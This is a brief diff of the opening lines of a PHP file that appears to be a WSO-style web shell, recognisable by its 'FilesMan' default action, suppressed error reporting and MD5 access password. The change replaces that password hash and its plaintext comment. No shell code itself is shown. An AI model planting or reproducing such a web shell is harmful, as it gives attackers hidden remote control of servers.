@@ -1,7 +1,7 @@
 <?php 
 session_start();
 error_reporting(0);
-$password = "015e21d9b882f2656679a2128b1a5975"; // gobloklo
+$password = "01a2f4c84901fd62e8845107993bb5f7"; // goblok
 $passtype = "MD5";
 $color = "#df5";
 $default_action = 'FilesMan';
